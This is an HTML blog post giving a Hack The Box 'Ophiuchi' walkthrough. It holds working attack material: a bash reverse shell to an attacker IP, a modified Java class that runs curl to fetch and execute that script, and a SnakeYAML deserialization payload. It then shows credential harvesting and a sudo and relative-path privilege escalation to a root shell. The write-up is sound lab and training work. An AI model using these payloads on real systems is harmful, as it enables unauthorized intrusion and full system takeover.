<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Imtodess ">
<meta name="description" content="Exploitation Guide for¬†Ophiuchi Summary: In this box, we will be exploiting yaml parsing (deserialization) vulnerability to get RCE¬†. Then exploit the misconfigured sudo privilege to gain the root shell.
Enumeration Nmap ‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/‚Ä¶/ctf/htb/ophiuchi/scans] ‚îî‚îÄ# nmap -sS -sV -T4 -p- -A 10.10.10.227 -oN nmap_full_syn.txt Starting Nmap 7.91 ( &amp;lt;https://nmap.org&amp;gt; ) at 2021-06-04 22:09 EDT Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 60." />
<meta name="keywords" content=", CTFs, boot2root, HTB, Linux, snakeyaml" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://imtodess.github.io/posts/2021/07/htb-ophiuchi-walkthrough/" />


    <title>
        
            HTB | Ophiuchi | Walkthrough :: Imtodess 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://imtodess.github.io/main.1b0c2a43eaa94aafc5b56185098d0d43797dccf963fa479c7a153b858461d09a.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://imtodess.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://imtodess.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://imtodess.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://imtodess.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://imtodess.github.io/safari-pinned-tab.svg" color="#1b1c1d">
    <link rel="shortcut icon" href="https://imtodess.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="#1b1c1d">
    <meta name="theme-color" content="#1b1c1d">



<meta itemprop="name" content="HTB | Ophiuchi | Walkthrough">
<meta itemprop="description" content="Exploitation Guide for¬†Ophiuchi Summary: In this box, we will be exploiting yaml parsing (deserialization) vulnerability to get RCE¬†. Then exploit the misconfigured sudo privilege to gain the root shell.
Enumeration Nmap ‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/‚Ä¶/ctf/htb/ophiuchi/scans] ‚îî‚îÄ# nmap -sS -sV -T4 -p- -A 10.10.10.227 -oN nmap_full_syn.txt Starting Nmap 7.91 ( &lt;https://nmap.org&gt; ) at 2021-06-04 22:09 EDT Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 60.">
<meta itemprop="datePublished" content="2021-07-08T18:52:03+05:45" />
<meta itemprop="dateModified" content="2021-07-08T18:52:03+05:45" />
<meta itemprop="wordCount" content="1073">
<meta itemprop="image" content="https://imtodess.github.io/img/portrait.jpg"/>



<meta itemprop="keywords" content="CTFs,boot2root,HTB,Linux,snakeyaml," />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://imtodess.github.io/img/portrait.jpg"/>

<meta name="twitter:title" content="HTB | Ophiuchi | Walkthrough"/>
<meta name="twitter:description" content="Exploitation Guide for¬†Ophiuchi Summary: In this box, we will be exploiting yaml parsing (deserialization) vulnerability to get RCE¬†. Then exploit the misconfigured sudo privilege to gain the root shell.
Enumeration Nmap ‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/‚Ä¶/ctf/htb/ophiuchi/scans] ‚îî‚îÄ# nmap -sS -sV -T4 -p- -A 10.10.10.227 -oN nmap_full_syn.txt Starting Nmap 7.91 ( &lt;https://nmap.org&gt; ) at 2021-06-04 22:09 EDT Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 60."/>




    <meta property="og:title" content="HTB | Ophiuchi | Walkthrough" />
<meta property="og:description" content="Exploitation Guide for¬†Ophiuchi Summary: In this box, we will be exploiting yaml parsing (deserialization) vulnerability to get RCE¬†. Then exploit the misconfigured sudo privilege to gain the root shell.
Enumeration Nmap ‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/‚Ä¶/ctf/htb/ophiuchi/scans] ‚îî‚îÄ# nmap -sS -sV -T4 -p- -A 10.10.10.227 -oN nmap_full_syn.txt Starting Nmap 7.91 ( &lt;https://nmap.org&gt; ) at 2021-06-04 22:09 EDT Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 60." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://imtodess.github.io/posts/2021/07/htb-ophiuchi-walkthrough/" />
<meta property="og:image" content="https://imtodess.github.io/img/portrait.jpg"/>
<meta property="article:published_time" content="2021-07-08T18:52:03+05:45" />
<meta property="article:modified_time" content="2021-07-08T18:52:03+05:45" />






    <meta property="article:published_time" content="2021-07-08 18:52:03 &#43;0545 &#43;0545" />










    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://imtodess.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">$</span>
            <span class="logo__text">cd ~/imtodess</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://imtodess.github.io/about/">About</a></li><li><a href="https://imtodess.github.io/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        6 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://imtodess.github.io/posts/2021/07/htb-ophiuchi-walkthrough/">HTB | Ophiuchi | Walkthrough</a>
      </h1>

      

      
        <hr />
        <aside id="toc">
          <div class="toc-title">Table of Contents</div>
          <nav id="TableOfContents">
  <ul>
    <li><a href="#exploitation-guide-forophiuchi">Exploitation Guide for¬†Ophiuchi</a>
      <ul>
        <li><a href="#summary">Summary:</a></li>
      </ul>
    </li>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#web-enumeration">Web Enumeration</a></li>
      </ul>
    </li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#initial-exploitation">Initial Exploitation</a></li>
        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </aside>
        <hr />

      

      <div class="post-content">
        <h2 id="exploitation-guide-forophiuchi">Exploitation Guide for¬†Ophiuchi</h2>
<h3 id="summary">Summary:</h3>
<p>In this box, we will be exploiting yaml parsing (deserialization) vulnerability to get RCE¬†. Then exploit the misconfigured sudo privilege to gain the root shell.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">Nmap</h3>
<pre><code>‚îå‚îÄ‚îÄ(rootüíÄkali)-[/home/‚Ä¶/ctf/htb/ophiuchi/scans]
‚îî‚îÄ# nmap -sS -sV -T4 -p- -A 10.10.10.227 -oN nmap_full_syn.txt
Starting Nmap 7.91 ( &lt;https://nmap.org&gt; ) at 2021-06-04 22:09 EDT
Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.21% done; ETC: 22:28 (0:07:30 remaining)
Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.23% done; ETC: 22:28 (0:07:30 remaining)
Stats: 0:11:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.27% done; ETC: 22:27 (0:07:29 remaining)
Nmap scan report for 10.10.10.227
Host is up (0.19s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
</code></pre><h3 id="web-enumeration">Web Enumeration</h3>
<p>Simple Web app (YAML parser ) in port 8080.
<img src="https://imtodess.github.io/img/ophiuchi/webpage.png" alt=""></p>
<p>Look for YAML parsing vulnerabilities. Below is the resource I found helpful.</p>
<p><a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">snakeyaml-deserialization</a></p>
<p><a href="https://github.com/mbechler/marshalsec">mbechler/marshalsec</a></p>
<p>We will be exploiting this deserialization vulnerability to get RCE.
Payload we are going to use.</p>
<p><a href="https://github.com/artsploit/yaml-payload">artsploit/yaml-payload</a></p>
<h2 id="exploitation">Exploitation</h2>
<h3 id="initial-exploitation">Initial Exploitation</h3>
<p>According to the exploit we can execute system commands on target machine using the Runtime.getRuntime().exec(). So we will create our own bash script which will give us Reverse shell when executed.
Create bash script <code>revshell.sh</code> with following content.</p>
<pre><code>#!/bin/sh
bash -i &gt;&amp; /dev/tcp/10.10.16.47/4444 0&gt;&amp;1
## modify the ip and port according to your needs
</code></pre><p>Then start a http server where the script it located. I used python to do this.</p>
<pre><code>python -m SimpleHTTPServer 80
</code></pre><p>Now We will modify the exploit so it will download our malicious script to the target machine and execute it. Modified part is in BOLD.</p>
<pre><code>package artsploit;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;
public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec(&quot;curl &lt;http://10.10.16.47/revshell.sh&gt; -o /tmp/revshell.sh&quot;);
            Runtime.getRuntime().exec(&quot;bash /tmp/revshell.sh&quot;);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
  ...
  ...
</code></pre><p>Now since we added the command we want to execute in target machine, we use the following commands to compile and get our payload jar file.</p>
<pre><code>cd yaml-payload
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
</code></pre><p>Finally insert the following YAML piece into the web parser to get RCE. Also start a netcat listener on the port you chose earlier.</p>
<pre><code>!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL [&quot;&lt;http://10.10.16.47/yaml-payload.jar&gt;&quot;]
  ]]
]
</code></pre><p><img src="https://imtodess.github.io/img/ophiuchi/webpage2.png" alt=""></p>
<p>Simple http server using python
<img src="https://imtodess.github.io/img/ophiuchi/webpage3.png" alt=""></p>
<p>Netcat listener to receive the shell.
<img src="https://imtodess.github.io/img/ophiuchi/webpage4.png" alt=""></p>
<p>We will get the shell as user tomcat
<img src="https://imtodess.github.io/img/ophiuchi/webpage5.png" alt=""></p>
<p>If we search for user flag. We see that its on <code>/home/admin/user.txt</code>¬†. We don&rsquo;t have any permission to access it. So lets find a way to escalate our privilege to user <code>admin</code>.
<img src="https://imtodess.github.io/img/ophiuchi/webpage6.png" alt="">
After some enumeration I found the <code>tomcat-users.xml</code> file in which credential of user <code>admin</code> was written in plain text. The file is at <code>/opt/tomcat/conf</code>.
<img src="https://imtodess.github.io/img/ophiuchi/webpage7.png" alt="">
Now that we have the credential we can ssh into the machine and grab that sweet user flag.
<img src="https://imtodess.github.io/img/ophiuchi/webpage8.png" alt=""></p>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>Run <code>sudo -l</code> to see if current user any <code>sudo</code> privileges. Seems like user admin can run /<code>usr/bin/go run /opt/wasm-functions/index.go</code> as root without any password.
<img src="https://imtodess.github.io/img/ophiuchi/webpage9.png" alt="">
Check the content of the file.</p>
<pre><code>## Content of index.go
package main
import (
        &quot;fmt&quot;
        wasm &quot;github.com/wasmerio/wasmer-go/wasmer&quot;
        &quot;os/exec&quot;
        &quot;log&quot;
)
func main() {
        bytes, _ := wasm.ReadBytes(&quot;main.wasm&quot;)
        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports[&quot;info&quot;]
        result,_ := init()
        f := result.String()
        if (f != &quot;1&quot;) {          &lt;==========================================
                fmt.Println(&quot;Not ready to deploy&quot;)
        } else {
                fmt.Println(&quot;Ready to deploy&quot;)
                out, err := exec.Command(&quot;/bin/sh&quot;, &quot;deploy.sh&quot;).Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
</code></pre><p>Here, we see that, functions and variables are imported from the <code>main.wasm</code> file and checking the value of the variable <code>f</code>, if it equals <code>1</code> we get ready to deploy and execute <code>/bin/sh deploy.sh</code>.</p>
<p>They are importing values from <code>main.wasm</code> and executing <code>deploy.sh</code> whose absolute path is not defined. So we can manipulate these. These files will be read from our current working directory, from where we run the <code>index.go</code> file.
Create the directory in <code>/tmp</code>. And copy the <code>main.wasm</code>.
<img src="https://imtodess.github.io/img/ophiuchi/webpage10.png" alt="">
Create our own <code>deploy.sh</code> and add the command which will give us the shell as root. I will be changing the permission of <code>/bin/bash</code>.
<img src="https://imtodess.github.io/img/ophiuchi/webpage11.png" alt="">
Now if you run the command¬†. We will get <code>not ready to deploy</code> message.
<img src="https://imtodess.github.io/img/ophiuchi/webpage12.png" alt="">
This means the variable <code>f</code> is not equal to <code>1</code> in wasm file. We need to change this value.
The text readable format of WASM binary is WAT(Web Assembly Text). We can manipulate the value of <code>f</code> editing the wasm file in this format. So we will change our file format from wasm to wat. To do that lets transfer the file to our machine first. I am using netcat to do that.
<img src="https://imtodess.github.io/img/ophiuchi/webpage14.png" alt="">
<img src="https://imtodess.github.io/img/ophiuchi/webpage13.png" alt=""></p>
<pre><code># Here's the command
cat main.wasm | nc {your-ip} {your-port}   (on target)
nc -lnvp {your-port} &gt; main.wasm           (on local)
</code></pre><p>Now lets convert it to wat¬†. You can do it using wabt. You can download in kali using apt install wabt¬†. You can also download and compile the binary from here:
<a href="https://github.com/webassembly/wabt">WebAssembly/wabt</a></p>
<p>After converting the wasm file we can see the following. we see that the value of f is a 0, we need to change it to 1.
<img src="https://imtodess.github.io/img/ophiuchi/webpage15.png" alt="">
Edit using any text editor. After changing the value convert it to wasm again using wat2wasm.
<img src="https://imtodess.github.io/img/ophiuchi/webpage16.png" alt=""></p>
<p>| Extra:
If you dont want to do this. You can copy the following line to the site mentioned below and download the wasm file.
<a href="https://webassembly.github.io/wabt/demo/wat2wasm/index.html">wat2wasm demo</a></p>
<pre><code>    (type (;0;) (func (result i32)))
    (func $info (type 0) (result i32)
      i32.const 1)
    (table (;0;) 1 1 funcref)
    (memory (;0;) 16)
    (global (;0;) (mut i32) (i32.const 1048576))
    (global (;1;) i32 (i32.const 1048576))
    (global (;2;) i32 (i32.const 1048576))
    (export &quot;memory&quot; (memory 0))
    (export &quot;info&quot; (func $info))
    (export &quot;__data_end&quot; (global 1))
    (export &quot;__heap_base&quot; (global 2)))
</code></pre><p>Now transfer the file to target machine. Remove the previous wasm file before transferring to prevent any errors. I am using scp to transfer the file.
<img src="https://imtodess.github.io/img/ophiuchi/webpage17.png" alt="">
Now we have everything ready. Just execute the command and our privilege will be escalated to root. As you can see we get <code>ready to deploy</code> message. This means it also executed our malicious <code>deploy.sh</code> script.
<img src="https://imtodess.github.io/img/ophiuchi/webpage18.png" alt=""></p>
<p>Since I changed the permission of <code>/bin/bash</code> I can just do <code>/bin/bash -p</code> and I will get the shell as root.
<img src="https://imtodess.github.io/img/ophiuchi/webpage19.png" alt=""></p>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://imtodess.github.io/tags/ctfs/">CTFs</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/boot2root/">boot2root</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/htb/">HTB</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/linux/">Linux</a></span>
        <span class="tag"><a href="https://imtodess.github.io/tags/snakeyaml/">snakeyaml</a></span>
        
    </p>

      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        1073 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2021-07-08 18:52
        

         
          
        
      </p>
    </div>

    
    <div class="pagination">
        <div class="pagination__title">
            <span class="pagination__title-h"></span>
            <hr />
        </div>

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="https://imtodess.github.io/posts/2021/07/thm-alfred-walkthrough/">
                    <span class="button__icon">‚Üê</span>
                    <span class="button__text">THM | Alfred | Walkthrough</span>
                </a>
            </span>
            

            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://imtodess.github.io/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>



    </body>
</html>
